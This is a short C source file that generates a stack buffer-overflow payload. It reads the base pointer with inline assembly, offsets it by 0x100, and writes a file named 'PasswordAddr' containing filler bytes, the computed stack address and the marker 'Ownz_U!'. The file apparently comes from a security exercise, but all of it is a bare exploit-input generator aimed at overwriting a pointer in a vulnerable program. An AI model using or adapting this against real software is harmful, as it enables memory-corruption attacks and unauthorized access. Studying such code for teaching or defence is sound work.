#include<stdio.h>

void main(){
 unsigned long int basePointer;
 __asm__("movq %%rbp, %0" : "=r"(basePointer));
 //printf("0x%lx\n", basePointer);

 basePointer = basePointer - 0x100;
 //printf("0x%lx\n", pwdAddress);

 FILE * f = fopen("PasswordAddr","w");
fwrite("iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii",sizeof(char*),16,f);
 fwrite(&basePointer,sizeof(unsigned long int),1,f);
 fwrite("\nOwnz_U!",sizeof(char*),1,f);
 fclose(f);
}
